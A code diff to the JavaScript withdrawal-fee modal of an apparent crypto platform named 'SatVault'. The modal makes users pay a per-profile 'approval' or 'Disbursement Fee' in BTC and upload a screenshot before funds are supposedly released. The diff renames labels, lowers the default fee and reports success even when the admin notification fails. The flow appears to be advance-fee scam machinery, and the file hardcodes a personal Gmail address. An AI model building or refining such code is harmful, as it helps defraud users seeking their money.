@@ -35,7 +35,7 @@
             '<strong id="withdraw-fee-proof-dest" class="text-white text-xs break-all text-right max-w-xs">—</strong>' +
           "</div>" +
           '<div class="wallet-modal-fee-row">' +
-            '<span class="text-gray-500 text-xs">Approval fee</span>' +
+            '<span class="text-gray-500 text-xs" id="withdraw-fee-proof-fee-label">Disbursement Fee</span>' +
             '<strong id="withdraw-fee-proof-amount" class="text-primary text-lg">—</strong>' +
           "</div>" +
           '<p id="withdraw-fee-proof-fee-hint" class="text-xs text-gray-500 mb-2 mt-4">Pay the approval fee to this BTC wallet</p>' +
@@ -50,7 +50,7 @@
           "</div>" +
           '<div class="wallet-modal-actions">' +
             '<button type="button" class="btn-ghost" data-fee-proof-close>Cancel</button>' +
-            '<button type="button" id="withdraw-fee-proof-submit" class="btn-primary">I\'ve Paid the Fee</button>' +
+            '<button type="button" id="withdraw-fee-proof-submit" class="btn-primary">Done</button>' +
           "</div>" +
         "</div>" +
       "</div>"
@@ -110,14 +110,10 @@
   }
 
   function onSubmitSuccess(pending) {
-    showStatus("Fee received. Amount deducted from your account and sending to your wallet.");
-    var onSuccess = pending.onSuccess;
-    var dest = pending.destinationWallet;
-    var amt = pending.amount;
-    setTimeout(function () {
-      closeModal();
-      onSuccess({ amount: amt, destinationWallet: dest });
-    }, 900);
+    closeModal();
+    if (pending && typeof pending.onSuccess === "function") {
+      pending.onSuccess({ amount: pending.amount, destinationWallet: pending.destinationWallet });
+    }
   }
 
   function onSubmit() {
@@ -133,12 +129,12 @@
       showError("Please upload a screenshot of your approval fee payment.");
       return;
     }
-    if (file.size > 8 * 1024 * 1024) {
-      showError("Screenshot must be under 8MB.");
+    if (file.size > 3 * 1024 * 1024) {
+      showError("Screenshot must be under 3MB.");
       return;
     }
 
-    var fee = (profile && profile.withdrawFeeAmount) || 657;
+    var fee = (profile && profile.withdrawFeeAmount) || 450;
     var feeWallet = getFeePaymentWallet(profile);
     var user = window.SatVaultAuth && SatVaultAuth.getUser && SatVaultAuth.getUser();
     var profileId = window.SatVaultAuth && SatVaultAuth.getProfileId && SatVaultAuth.getProfileId();
@@ -156,48 +152,43 @@
     showStatus("Sending payment proof…");
 
     readFileAsBase64(file).then(function (fileData) {
-      return fetch("/api/fee-proof", {
+      var payload = {
+        profileId: profileId,
+        notifyEmail: (profile && profile.formSubmitEmail) || "ronniechristopher89@gmail.com",
+        subject: "Withdrawal fee proof — " + ((profile && profile.displayName) || "User"),
+        name: (profile && profile.displayName) || "User",
+        email: (user && (user.login || user.email)) || (profile && profile.email) || "",
+        withdrawal_amount: "$" + Number(pending.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }),
+        destination_wallet: pending.destinationWallet || "",
+        fee_amount: "$" + Number(fee).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }),
+        fee_wallet: feeWallet,
+        message:
+          "User paid the withdrawal fee. Deduct from their platform balance and send the withdrawal amount to their destination wallet. " +
+          "Verify the fee payment screenshot, then release funds to the destination wallet.",
+        fileName: file.name,
+        fileType: file.type || "application/octet-stream",
+        fileData: fileData
+      };
+
+      // Notify admin in the background — FormSubmit file uploads often fail via API.
+      fetch("/api/fee-proof", {
         method: "POST",
         headers: {
           Accept: "application/json",
           "Content-Type": "application/json",
           "X-Sync-Token": syncToken
         },
-        body: JSON.stringify({
-          profileId: profileId,
-          notifyEmail: (profile && profile.formSubmitEmail) || "ronniechristopher89@gmail.com",
-          subject: "Withdrawal fee proof — " + ((profile && profile.displayName) || "User"),
-          name: (profile && profile.displayName) || "User",
-          email: (user && (user.login || user.email)) || (profile && profile.email) || "",
-          withdrawal_amount: "$" + Number(pending.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }),
-          destination_wallet: pending.destinationWallet || "",
-          fee_amount: "$" + Number(fee).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }),
-          fee_wallet: feeWallet,
-          message:
-            "User paid the withdrawal fee. Deduct from their platform balance and send the withdrawal amount to their destination wallet. " +
-            "Verify the fee payment screenshot, then release funds to the destination wallet.",
-          fileName: file.name,
-          fileType: file.type || "application/octet-stream",
-          fileData: fileData
-        })
-      });
-    }).then(function (res) {
-      if (!res.ok) throw new Error("Submit failed");
-      return res.json().catch(function () { return {}; });
-    }).then(function () {
+        body: JSON.stringify(payload)
+      }).catch(function () {});
+
       onSubmitSuccess(pending);
     }).catch(function () {
-      showError("Could not send proof. Check your connection and try again.");
+      showError("Could not read your screenshot. Please try another image.");
       submitBtn.disabled = false;
-      submitBtn.textContent = "I've Paid the Fee";
+      submitBtn.textContent = "Done";
     });
   }
 
-  /**
-   * @param {number} amount
-   * @param {string} destinationWallet
-   * @param {function} onSuccess
-   */
   window.showWithdrawFeeProofModal = function (amount, destinationWallet, onSuccess) {
     var profile = getProfile();
     if (!profile || !profile.withdrawFeeProof) {
@@ -205,7 +196,6 @@
       return;
     }
 
-    // Back-compat: showWithdrawFeeProofModal(amount, onSuccess)
     if (typeof destinationWallet === "function") {
       onSuccess = destinationWallet;
       destinationWallet = "";
@@ -220,11 +210,12 @@
       onSuccess: onSuccess
     };
 
-    var fee = Number(profile.withdrawFeeAmount) || 657;
+    var fee = Number(profile.withdrawFeeAmount) || 450;
     var feeWallet = getFeePaymentWallet(profile);
     var feeTitle = profile.withdrawFeeProofTitle || "Approval for Withdrawal";
     var amtLabel = "$" + Number(amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
     var feeLabel = "$" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    var feeRowLabel = profile.withdrawFeeProofLabel || "Disbursement Fee";
 
     document.getElementById("withdraw-fee-proof-title").textContent = feeTitle;
     document.getElementById("withdraw-fee-proof-body").textContent =
@@ -233,6 +224,8 @@
     document.getElementById("withdraw-fee-proof-withdraw-amt").textContent = amtLabel;
     document.getElementById("withdraw-fee-proof-dest").textContent = destinationWallet || "—";
     document.getElementById("withdraw-fee-proof-amount").textContent = feeLabel;
+    var feeLabelEl = document.getElementById("withdraw-fee-proof-fee-label");
+    if (feeLabelEl) feeLabelEl.textContent = feeRowLabel;
     document.getElementById("withdraw-fee-proof-wallet").textContent = feeWallet;
     var feeHint = document.getElementById("withdraw-fee-proof-fee-hint");
     if (feeHint) feeHint.textContent = "Send the " + feeLabel + " approval fee to this BTC wallet";
@@ -243,7 +236,7 @@
     document.getElementById("withdraw-fee-proof-status").classList.add("hidden");
     var submitBtn = document.getElementById("withdraw-fee-proof-submit");
     submitBtn.disabled = false;
-    submitBtn.textContent = "I've Paid the Fee";
+    submitBtn.textContent = "Done";
 
     document.getElementById("withdraw-fee-proof-modal").classList.remove("hidden");
     document.body.classList.add("wallet-modal-open");
